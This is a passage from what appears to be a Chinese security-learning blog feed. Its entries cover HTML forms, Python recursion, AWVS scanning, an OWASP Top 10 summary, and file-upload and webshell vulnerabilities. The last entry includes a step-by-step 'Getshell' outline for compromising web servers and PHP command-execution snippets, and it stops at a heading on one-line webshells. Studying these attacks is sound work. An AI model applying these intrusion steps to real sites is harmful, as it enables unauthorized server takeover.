class="headerlink" title="常见的输入限制"></a>常见的输入限制</h3><p><img src="https://i.loli.net/2021/03/15/cX2CD8gmvsU5NM4.png" alt="image-20210315194834108"></p><h4 id="value属性"><a href="#value属性" class="headerlink" title="value属性"></a>value属性</h4><p>value属性规定输入字段的初始值</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot;&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/EQ3ZUHK25VmNazJ.png" alt="image-20210315200004163"></p><h4 id="readonly属性"><a href="#readonly属性" class="headerlink" title="readonly属性"></a>readonly属性</h4><p>（1）readonly属性规定输入字段为只读（不能修改），可以提交元素</p><p>（2）readonly属性不需要值。它等同于readonly=”readonly”</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot; readonly&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/C5cdxHKPrQlEyks.png" alt="image-20210315200652188"></p><h4 id="disabled属性"><a href="#disabled属性" class="headerlink" title="disabled属性"></a>disabled属性</h4><p>（1）disabled属性规定输入字段是禁用的。</p><p>（2）被禁用的元素是不可用和不可点击的，且被禁用的元素不会被提交</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form action=&quot;&quot;&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; value=&quot;dayang&quot; disabled&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/8coQvE591CNPrse.png" alt="image-20210315201127969"></p><h4 id="maxlength属性"><a href="#maxlength属性" class="headerlink" title="maxlength属性"></a>maxlength属性</h4><p>（1）maxlength属性规定输入字段允许的最大长度，如设置maxlength属性，则输入控件不会接受超过所允许数的字符。</p><p>（2）该属性不会提供任何反馈，如果需要提醒用户，则必须编写JavaScript代码。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;form&gt;            First name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;firstname&quot; maxlength=&quot;5&quot;&gt;            &lt;br&gt;            Last name:&lt;br&gt;            &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/G3P7WS9TyxmajAC.png" alt="image-20210315202015566"></p><h3 id="HTML-DOM"><a href="#HTML-DOM" class="headerlink" title="HTML DOM"></a>HTML DOM</h3><p>（1）HTML的文档对象模型</p><p>（2）HTML的标准编程接口</p><p>（3）HTML DOM定义了所有HTML元素的对象和属性，以及访问他们的方法。</p><p>（4）换言之，HTML DOM 是关于如何获取、修改、添加或删除HTML元素的标准。</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;title&gt;文档标题&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;a href=&quot;http://since1994.cn&quot;&gt;我的链接&lt;/a&gt;        &lt;h1&gt;            我的标题        &lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/15/6B3MxtUWLwaRqK5.png" alt="image-20210315204251708"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(六)</title>
      <link href="2021/02/11/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AD)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A802/"/>
      <url>2021/02/11/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AD)-%E5%87%BD%E6%95%B0%E5%92%8C%E4%BB%A3%E7%A0%81%E5%A4%8D%E7%94%A802/</url>
      
        <content type="html"><![CDATA[<h2 id="代码复用和模块化设计"><a href="#代码复用和模块化设计" class="headerlink" title="代码复用和模块化设计"></a>代码复用和模块化设计</h2><p><strong>要点：函数是程序的一种抽象，它通过封装实现代码复用，可以利用函数对程序进行模块化设计</strong></p><p>（1）程序代码若是顺序但无组织的，不仅不利于阅读和理解，也很难进行升级和维护。因此，需要对代码进行抽象，形成易于理解的结构。当代编程语言从代码层面采用函数和对象两种抽象方式，分别对应<strong>面向过程和面向对象编程思想。</strong></p><p>（2）函数封装的直接好处是代码复用，从而避免相同功能代码在调用出重复编写。代码复用产生了另一个好处，当更新函数功能时，所有被调用处的功能都被更新。</p><p>（3）面向过程是一种以过程描述为主要方法的编程方式，该方法要求列出解决问题所需要的步骤，再用函数将这些步骤逐一实现，使用时依次建立并调用函数或编写语句即可。这是一种基本且自然的程序设计方法，函数通过将步骤或子功能封装实现代码复用并简化程序设计难度。</p><p>（4）面向对象编程：对象是程序的一种高级抽象方式，它将程序代码组织为更高级的类。对象包括表征对象特征的属性和代表对象操作的方法。在程序设计中，若&lt;a&gt;代表对象，获取其属性&lt;b&gt;采用&lt;a&gt;.&lt;b&gt;，调用其方法&lt;c&gt;采用&lt;a&gt;.&lt;c&gt;()。对象的方法具有程序功能性，因此采用函数形式封装。对象可以凝聚更多代码，所以面向对象编程更适合代码规模较大，交互逻辑复杂的程序。</p><p>（5）Python语言同时支持面向过程和面向对象两种编程方式。无论是面向过程还是面向对象编程，对程序合理划分功能模块并基于模块设计程序是一种常用方法，被称为“模块化设计”，即将一个程序分隔成短小的程序段，每一段程序完成一个小的功能。</p><h2 id="函数的递归"><a href="#函数的递归" class="headerlink" title="函数的递归"></a>函数的递归</h2><h3 id="递归的定义"><a href="#递归的定义" class="headerlink" title="递归的定义"></a>递归的定义</h3><p>（1）函数定义中调用函数自身的方式称为递归。例如数学中的阶乘</p><p><img src="https://i.loli.net/2021/02/11/AmfsY7pe3naKUHS.png" alt="image-20210211152129282"></p><p>（2）递归的两个关键特征：</p><ul><li>存在一个或多个基例(例如0!)，基例不需要再次递归，它是确定的表达示或已知的值。</li><li>所有递归链要以一个或多个基例结尾</li></ul><h3 id="递归的使用方法"><a href="#递归的使用方法" class="headerlink" title="递归的使用方法"></a>递归的使用方法</h3><p>（1）实例：阶乘的计算：根据用户输入的整数n，计算并输出n的阶乘值。</p><pre><code class="python">def fact(n):    if n == 0:        return 1    else:        return n*fact(n-1)num = eval(input(&quot;请输入一个整数：&quot;))print(fact(abs(int(num))))</code></pre><p>（2）fact()函数在其定义内部引用了自身，形成了递归过程(第5行)。无限制的递归将耗尽计算资源，因此需要设计基例使得递归逐层返回。fact()函数通过if语句给出了n为0时的基例，当n==0，fact()函数不再递归，返回数值1，若n!=0,则通过递归返回n与n-1阶乘的乘积。</p><p>（3）由于负数和小数通过减一无法达到递归的基例(n==0)，代码第7行通过abs()和int()函数将用户输入转变成非负整数。</p><p>（4）递归遵循函数第语义，每次调用都会引起新函数的开始，表示它有本地变量值的副本，包括函数的参数。每次调用时，函数参数的副本会临时存储，递归中各函数在运算自己的参数，互不影响。当基例结束运算并返回值时，各函数逐层结束运算，向调用者返回计算结果。</p><p><strong>注意：使用递归一定要注意基例的构建，否则递归无法返回将会报错。</strong></p><p>（5）实例：字符串反转：对于用户输入的字符串s，输出反转后的字符串。</p><p>解决问题的基本思想：把一个字符串看成仅由首字符和剩余字符串两部分组成，若将剩余字符串和首字符交换，就完成了反转整个字符串。代码如下：</p><pre><code class="python">&gt;&gt;&gt; def reverse(s):    return reverse(s[1:]) + s[0]    #s[0]是首字符，s[1:]是剩余字符串&gt;&gt;&gt; reverse(&quot;abc&quot;)Traceback (most recent call last):  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;    reverse(&quot;abc&quot;)  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse    return reverse(s[1:]) + s[0]  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse    return reverse(s[1:]) + s[0]  File &quot;&lt;pyshell#2&gt;&quot;, line 2, in reverse    return reverse(s[1:]) + s[0]  [Previous line repeated 991 more times]RecursionError: maximum recursion depth exceeded</code></pre><p>（6）上述代码出错，该错误表明系统无法执行reverse()函数创建的递归，这是因为reverse()函数没有基例，递归层数超过了系统允许的最大递归深度。默认情况下，当递归调用到1000层，Python解释器将终止程序。递归深度是为了防止无限递归错误而设计的，当用户编写的正确递归程序需要超过1000层时，可以通过如下代码设定。</p><pre><code class="python">&gt;&gt;&gt;import sys&gt;&gt;&gt;sys.setrecursionlimit(2000)    #2000是新的递归层数</code></pre><p>（7）reverse()函数超过递归深度是因为没有设计基例。可以把基例设计为字符串的最短形式，即空字符串。代码如下：</p><pre><code class="python">def reverse(s):    if s == &quot;&quot;:        return s    else:        return reverse(s[1:]) + s[0]str = input(&quot;请输入一个字符串：&quot;)print(reverse(str))</code></pre><h2 id="实例：科赫曲线绘制"><a href="#实例：科赫曲线绘制" class="headerlink" title="实例：科赫曲线绘制"></a>实例：科赫曲线绘制</h2><p>（1）科赫曲线在众多经典数学曲线中非常著名，由于其形状类似雪花，也被称为雪花曲线。</p><p>（2）正整数n代表科赫曲线的阶数，表示生成科赫曲线过程的操作次数。科赫曲线初始化阶数为0，表示一个长度为L的直线。对于直线L，将其等分为3段，中间一段用边长为L/3的等边三角形的两个边代替，得到1阶科赫曲线，它包含4条线段。进一步对每条线段重复同样的操作后得到2阶科赫曲线。继续重复同样的操作n次可以得到n阶科赫曲线。</p><p><img src="https://i.loli.net/2021/02/11/2GwhWLdFHp6fSTv.png" alt="image-20210211210938960"></p><p>（3）科赫曲线属于分形几何分支，其绘制过程体现了递归思想，绘制过程代码如下：</p><pre><code class="python">import turtledef koch(size, n):    if n==0:        turtle.fd(size)    else:        for angle in [0, 60, -120, 60]:            turtle.left(angle)            koch(size/3, n-1)def main():    turtle.setup(800,400)    turtle.speed(0)          #控制绘制速度    turtle.penup()    turtle.goto(-300,-50)    turtle.pendown()    turtle.pensize(2)    koch(600,3)              #0阶科赫曲线长度，阶数    turtle.hideturtle()main()</code></pre><p>（4）n阶科赫曲线的绘制相当于在画笔前进方向的0°、60°、-120°和60°分别绘制n-1阶曲线。在给定初始图形后，通过科赫曲线可以生成很多漂亮的图形。代码如下。</p><pre><code class="python">import turtledef koch(size, n):    if n == 0:        turtle.fd(size)    else:        for angle in [0, 60, -120, 60]:            turtle.left(angle)            koch(size/3, n-1)def main():    turtle.setup(600,600)    turtle.speed(0)    turtle.penup()    turtle.goto(-200,100)    turtle.pendown()    turtle.pensize(2)    level=5    koch(400,level)    turtle.right(120)    koch(400,level)    turtle.hideturtle()main()</code></pre><h2 id="Python内置函数"><a href="#Python内置函数" class="headerlink" title="Python内置函数"></a>Python内置函数</h2><p>（1）Python解释器提供了68个内置函数，这些函数不需要引用库直接使用。以下对部分函数进行说明</p><p>（2）all()函数一般针对组合数据类型，如果其中每个元素都是True，则返回True，否则返回False。注意：整数0、空字符串””、空列表[]等都被当做False。</p><p>（3）any()函数与all()函数相反，只要组合数据中任何一个是True，则返回True，全部元素都是False才返回False。</p><p>（4）hash()函数对于能够计算哈希的类型返回哈希值。</p><p>（5）id()函数对每一个数据返回唯一编号，数据不同编号不同，可以通过比较两个变量编号是否相同判断数据是否一致。Python将数据存储在内存中的地址作为其唯一编号。</p><p>（6）reversed()函数返回输入组合数据类型的逆序形式。</p><p>（7）sorted()函数对一个序列进行排序，默认从小到大排序。</p><p>（8）type()函数返回每个数据对应的类型。</p><p>实例如下：</p><pre><code class="python">&gt;&gt;&gt; ls = [1,2,5,0]&gt;&gt;&gt; all(ls)False&gt;&gt;&gt; any(ls)True&gt;&gt;&gt; hash(&quot;中国，你好&quot;)8827663102129553702&gt;&gt;&gt; id(ls)2463935192072&gt;&gt;&gt; list(reversed(ls))[0, 5, 2, 1]&gt;&gt;&gt; sorted(ls)       #不改变ls的值[0, 1, 2, 5]&gt;&gt;&gt; ls[1, 2, 5, 0]&gt;&gt;&gt; sorted(ls, reverse=True)[5, 2, 1, 0]&gt;&gt;&gt; type(ls)&lt;class &#39;list&#39;&gt;&gt;&gt;&gt; type(reversed(ls))&lt;class &#39;list_reverseiterator&#39;&gt;</code></pre><p>（9）Python使用手册<a href="https://docs.python.org/3">https://docs.python.org/3</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB漏洞扫描与渗透测试</title>
      <link href="2021/02/01/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2021/02/01/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEB%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞扫描器AWVS"><a href="#WEB漏洞扫描器AWVS" class="headerlink" title="WEB漏洞扫描器AWVS"></a>WEB漏洞扫描器AWVS</h2><p>AWVS（Acunetix Web Vulnerability Scanner）自动化的Web漏洞扫描器，审查漏洞如SQL注入，XSS跨站脚本攻击等其他能被黑客利用存在漏洞的网页应用。</p><p>AWVS的使用步骤：</p><p>①　打开浏览器访问：<a href="https://localhost:3443（其中localhost可为存在AWVS工具的主机IP）">https://localhost:3443（其中localhost可为存在AWVS工具的主机IP）</a></p><p>②　在Targets栏，创建一个新的扫描目标</p><p>③　填写目标地址和扫描描述并点击创建目标</p><p>④　若无需登录扫描，则下一步点击scan开始扫描</p><p>⑤　选择扫描类型和报告类型，一般选择Full Scan和Affected Items</p><p>⑥　点击Create Scan开始进行扫描</p><p>⑦　可以在Scans模块查看扫描进度，和漏洞信息</p><p>⑧　在Reports，可以将扫描结果导出成PDF或者HTML格式的报告</p><h2 id="WEB漏洞扫描与验证"><a href="#WEB漏洞扫描与验证" class="headerlink" title="WEB漏洞扫描与验证"></a>WEB漏洞扫描与验证</h2><h3 id="漏洞验证的基本流程："><a href="#漏洞验证的基本流程：" class="headerlink" title="漏洞验证的基本流程："></a>漏洞验证的基本流程：</h3><p>一般步骤是：先提取关键信息–&gt;验证漏洞是否存在–&gt;判断漏洞危害性–&gt;重新记录整理报告</p><p>每个步骤所需要做到的：</p><table><thead><tr><th align="center">提取关键信息</th><th align="center">验证漏洞是否存在</th><th align="center">判断漏洞危害性</th><th align="center">漏洞记录</th></tr></thead><tbody><tr><td align="center">漏洞类型</td><td align="center">存在</td><td align="center">高风险</td><td align="center">基本信息</td></tr><tr><td align="center">漏洞位置</td><td align="center">不存在</td><td align="center">中风险</td><td align="center">验证过程</td></tr><tr><td align="center">漏洞判断依据</td><td align="center"></td><td align="center">低风险</td><td align="center">解决方案</td></tr></tbody></table><h3 id="解读漏洞报告"><a href="#解读漏洞报告" class="headerlink" title="解读漏洞报告"></a>解读漏洞报告</h3><ul><li>漏洞名称：漏洞的名称，通常包括了漏洞的具体类型</li><li>风险等级：描述漏洞的风险等级</li><li>漏洞描述：描述漏洞的基本概念、原理、产生原因等</li><li>漏洞详情：通常包括漏洞的URL、关键参数、漏洞验证payload以及漏洞判断依据等，部分扫描还会提供验证漏洞的请求包和响应包等信息</li><li>漏洞危害：描述漏洞可能会产生什么样的危害</li><li>修复建议：如何修复漏洞的建议</li><li>参考资料：包括补充说明、参考链接等，对于一些组件漏洞通常包含CVE编号或厂家的漏洞说明等</li></ul><h3 id="漏洞记录编写"><a href="#漏洞记录编写" class="headerlink" title="漏洞记录编写"></a>漏洞记录编写</h3><p>主要分为：</p><p>①　漏洞记录表：记录漏洞的类型、风险等级、漏洞描述、漏洞该位置和修复建议信息</p><p>②　漏洞验证过程记录：主要包含验证过程使用的关键payload，详细的漏洞复现步骤，并配有图文描述。</p><h2 id="WEB渗透思路"><a href="#WEB渗透思路" class="headerlink" title="WEB渗透思路"></a>WEB渗透思路</h2><p>WEB应用渗透的目标：通过webshell控制服务器，这个过程通常被称为Getshell</p><p>常见的Getshell过程：</p><p>(1) 漏洞扫描：通过扫描器发现网站存在的漏洞，重点关注SQL注入、命令执行、文件上传等漏洞。</p><p>(2) 后台发现：通过搜索引擎或扫描器发现网站后台登录页面或敏感文件。</p><p>(3) 后台登录：通过SQL注入、暴力破解、敏感文件下载等方式登录网站后台。</p><p>(4) 文件上传：查找文件上传漏洞，上传webshell控制服务器。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP与常见WEB漏洞</title>
      <link href="2021/01/23/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/OWASP%E4%B8%8E%E5%B8%B8%E8%A7%81WEB%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/23/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/OWASP%E4%B8%8E%E5%B8%B8%E8%A7%81WEB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="OWASP介绍"><a href="#OWASP介绍" class="headerlink" title="OWASP介绍"></a>OWASP介绍</h2><p>（1）OWASP是一个开源的、非盈利的全球性安全组织，致力于应用软件的安全研究。<strong>OWASP的使命是使应用软件更加安全，使企业和组织能够对应用安全风险做出更清晰的决策。</strong>截至2020年，OWASP全球拥有250个分部近7万名会员，共同推动了安全标准、安全测试工具、安全指导手册等应用安全技术的发展。</p><p>（2）官网：<a href="http://www.owasp.org.cn/">http://www.owasp.org.cn/</a></p><p>（3）OWASP TOP10指出了WEB应用面临最大风险的10类向题，是目前WEB应用安全方面最权威的项目。</p><h2 id="OWASP-TOP-10与常见漏洞讲解"><a href="#OWASP-TOP-10与常见漏洞讲解" class="headerlink" title="OWASP TOP 10与常见漏洞讲解"></a>OWASP TOP 10与常见漏洞讲解</h2><h3 id="OWASP-TOP-10-2017年版"><a href="#OWASP-TOP-10-2017年版" class="headerlink" title="OWASP TOP 10(2017年版)"></a>OWASP TOP 10(2017年版)</h3><p>A1：注入</p><p>A2：失效的身份认证</p><p>A3：敏感数据泄露</p><p>A4：XML外部实体</p><p>A5：失效的访问控制</p><p>A6：安全配置错误</p><p>A7：跨站请求脚本（XSS）</p><p>A8：跨站请求伪造（CSRF）</p><p>A9：不安全的反序列化</p><p>A10：使用含有已知漏洞的组件</p><h3 id="A1：注入"><a href="#A1：注入" class="headerlink" title="A1：注入"></a>A1：注入</h3><p>（1）注入：用户的输入被当成命令/代码执行或者解析了。</p><p>（2）SQL注入攻击指的是：通过构建特殊的输入作为参数传入WEB应用程序，改变原有的SQL语句的语义来执行攻击者所要的操作。</p><p>（3）其主要原因是：程序没有采用必要的措施避免用户输入内容改变原有SQL语句的语义。</p><p>（4）SQL注入的危害：</p><ul><li>绕过登录验证：使用万能密码登录网站后台等。</li><li>获取敏感数据：获取网站管理员账号、密码等。</li><li>文件系统操作：列目录，读取、写入文件等。</li><li>注册表操作：读取、写入、删除注册表等。</li><li>执行系统命令：远程执行命令。</li></ul><h3 id="A2：失效的身份认证-业务逻辑漏洞"><a href="#A2：失效的身份认证-业务逻辑漏洞" class="headerlink" title="A2：失效的身份认证(业务逻辑漏洞)"></a>A2：失效的身份认证(业务逻辑漏洞)</h3><p>因为各种代码或者逻辑缺陷，导致绕过登陆或者匿名顶替登陆等</p><p>通常的漏洞存在形式：</p><ul><li>暴力破解登录</li><li>撞库</li><li>默认口令</li><li>二次校验失败</li><li>数据明文传输</li><li>URL暴露会话ID</li><li>用户登录后不会更换会话ID（固定会话攻击）</li><li>会话不会失败</li></ul><h3 id="A3：敏感数据泄漏"><a href="#A3：敏感数据泄漏" class="headerlink" title="A3：敏感数据泄漏"></a>A3：敏感数据泄漏</h3><p>许多Web应用程序和API都无法正确保护敏感数据。由于未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p><h3 id="A4：XML-外部实体（XXE）"><a href="#A4：XML-外部实体（XXE）" class="headerlink" title="A4：XML 外部实体（XXE）"></a>A4：XML 外部实体（XXE）</h3><p>XML是一种类似HTML的标记性语言，可以用来标记数据、定义数据类型，是一种允许用户对自己语言进行定义的源语言。</p><p>（1）xml引用实体格式如下：<br>&lt;!ENTITY 实体引用名 “引用内容”&gt;</p><p>（2）实体分两类：一般实体和参数实体</p><p>（3）一般实体，可以在XML文档中的任何位置出现的实体称为一般实体。实体可以声明为内部实体还是外部实体。外部实体分SYSTEM和PUBLIC两种。<br>SYSTEM引用本地计算机，PUBLIC引用公共计算机，外部实体格式如下：<br>&lt;!ENTITY 引用名 SYSTEM(PUBLIC) “URL地址”&gt;</p><h3 id="A5：失效的访问控制-业务逻辑漏洞"><a href="#A5：失效的访问控制-业务逻辑漏洞" class="headerlink" title="A5：失效的访问控制(业务逻辑漏洞)"></a>A5：失效的访问控制(业务逻辑漏洞)</h3><p>（1）失效的访问控制就是越权访问漏洞。</p><p>（2）未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><p>（3）越权访问分为垂直越权和水平越权。</p><ul><li>垂直越权：低权限用户可以访问更高权限用户才能访问的资源</li><li>水平越权：同级权限用户之间的权限控制失效</li></ul><h3 id="A6：安全配置错误"><a href="#A6：安全配置错误" class="headerlink" title="A6：安全配置错误"></a>A6：安全配置错误</h3><p>（1）安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的详细错误信息所造成。</p><p>（2）防范方法：需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><h3 id="A7：跨站脚本（XSS）"><a href="#A7：跨站脚本（XSS）" class="headerlink" title="A7：跨站脚本（XSS）"></a>A7：跨站脚本（XSS）</h3><p>（1）当应用程序的新网页中包含不受信任的、未经恰当验证或转移的数据时，或者使用可以创建HTML或JavaScript的浏览器API更新现有的网页时，就会出现XSS缺陷。XSS让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><p>（2）三种类型XSS：</p><ul><li>反射式XSS:应用程序或API包括未经验证转义的用户输入，作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的HTML和JavaScript。通常，用户将需要与指向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，广告或类似内容。</li><li>存储式XSS：应用程序或者API将未净化的用户输入存储下来了，并在后期在其他用户或者管理员的页面展示出来。该类型XSS一般被认为是高危或严重的风险。</li><li>基于DOM的XSS：会动态的将攻击者可控的内容加入页面的JavaScript框架、单页面程序或API存在这种类型的漏洞。</li></ul><h3 id="A8：2013-跨站请求伪造（CSRF）"><a href="#A8：2013-跨站请求伪造（CSRF）" class="headerlink" title="A8：2013 跨站请求伪造（CSRF）"></a>A8：2013 跨站请求伪造（CSRF）</h3><p>跨站请求伪造原理：一个跨站请求伪造攻击会迫使登录用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的web应用程序发送请求，而这些请求会被应用程序认为是用户的合法请求。</p><h3 id="A9：不安全的反序列化"><a href="#A9：不安全的反序列化" class="headerlink" title="A9：不安全的反序列化"></a>A9：不安全的反序列化</h3><p>（1）序列化指将对象转换为字节序列的过程，就是一种用来处理对象流的机制，所谓对象流也就是将对象的内容进行流化。可以对流化后的对象进行读写操作，也可将流化后的对象传输于网络之间。</p><p>（2）序列化的目的：为了解决在对对象流进行读写操作时所引发的问题。以某种存储形式使自定义对象持久化，将对象从一个地方传递到另一个地方；使程序更具维护性。</p><p>（3）反序列化原理：将二进制数据转换为原对象，即从一些列字节提取数据结构的反向操作。</p><p>（4）不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p><p>（5）对反序列化的利用是有点困难的。因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难被使用。</p><p>（6）可能导致的两种主要类型的攻击：</p><ul><li>如果应用中存在可以在反序列过程中或者之后被改变行为的类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我们将其称为对象和数据结构攻击。</li><li>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有的数据结构，但内容发生了变化。</li></ul><h3 id="A10：使用含有已知漏洞的组件"><a href="#A10：使用含有已知漏洞的组件" class="headerlink" title="A10：使用含有已知漏洞的组件"></a>A10：使用含有已知漏洞的组件</h3><p>（1）组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p><p>（2）经常爆出漏洞的组件：</p><ul><li>Weblogic</li><li>Strust-2</li></ul><p>（3）使用K8工具对Struts2进行利用</p><p><img src="https://i.loli.net/2021/02/01/SkxCHF5qPGWOIvl.png" alt="image-20210201113438259"></p><p><img src="https://i.loli.net/2021/02/01/fasUSd1K5Ao7jXh.png" alt="image-20210201113503859"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全初级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEBshell与文件上传漏洞</title>
      <link href="2021/01/19/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEBshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/01/19/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/WEBshell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><strong>Webshell：以网页形式存在的一种命令执行环境(是一种网页后门)</strong></p><h2 id="文件上传功能"><a href="#文件上传功能" class="headerlink" title="文件上传功能"></a>文件上传功能</h2><p>文件上传功能是大部分WEB应用的必备功能，网站允许用户自行上传头像、一些社交类网站允许用户上传照片、一些服务类网站需要用户上传证明材料的电子档、电商类网站允许用户上传图片展示商品情况等。然而，<strong>看似不起眼的文件上传功能如果没有做好安全防护措施，就存在巨大的安全风险。</strong> </p><h3 id="文件上传流程和上传攻击"><a href="#文件上传流程和上传攻击" class="headerlink" title="文件上传流程和上传攻击"></a>文件上传流程和上传攻击</h3><p>（1）如果WEB应用在<strong>文件上传过程</strong>中没有对文件的安全性进行有效的校验，攻击者可以通过<strong>上传WEBshell等恶意文件对服务器进行攻击</strong>，这种情况下认为系统存在文件上传漏洞。</p><p>（2）一个文件上传的一般流程：</p><p><img src="https://i.loli.net/2021/01/23/Ud94mZEj8iaf6vg.png" alt="image-20210123155132231"></p><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p><img src="https://i.loli.net/2021/01/23/bjMHPvfaRYDGpyE.png" alt="image-20210123163059178"></p><h3 id="后端校验"><a href="#后端校验" class="headerlink" title="后端校验"></a>后端校验</h3><p><img src="https://i.loli.net/2021/01/23/ZwovTqJ8hWBIfyH.png" alt="image-20210123163718803"></p><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="PHP执行命令函数"><a href="#PHP执行命令函数" class="headerlink" title="PHP执行命令函数"></a>PHP执行命令函数</h3><p>（1）**system()**：执行shell语句，输出并返回shell结果</p><pre><code class="php">&lt;?php    echo system(&#39;ipconfig&#39;);?&gt;</code></pre><p>（2）**passthru()**：调用命令，输出并返回执行结果</p><pre><code class="php">&lt;?php    echo passthru(&#39;whoami&#39;);?&gt;</code></pre><p>（3）**其他的命令执行函数：Exec()、Shell_exec()**：只执行命令(返回最后一行结果)</p><h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h3><p>（1）语法：<strong>eval(phpcode)</strong></p><p>（2）概念：把字符串按照PHP代码来计算</p><pre><code class="php">&lt;?php    $str=&quot;echo &#39;goktech&#39;;echo 333+333;&quot;;    echo $str;    echo &quot;&lt;br/&gt;&quot;;    eval(&quot;$str&quot;);?&gt;</code></pre><p><img src="https://i.loli.net/2021/01/23/yhIZj4lpfLukV3z.png" alt="image-20210123164741040"></p><p><strong>PS:该字符串必须是合法的PHP代码，且必须以分号结尾。</strong></p><h2 id="一句话木马原理及利用"><a href="#一句话木马原理及利用" class="headerlink" title="一句话木马原理及利用"></a>一句话木马原理及利用</h2><h3 id="WEBshell——网页木马文件"><a href="#WEBshell——网页木马文件" class="headerlink" 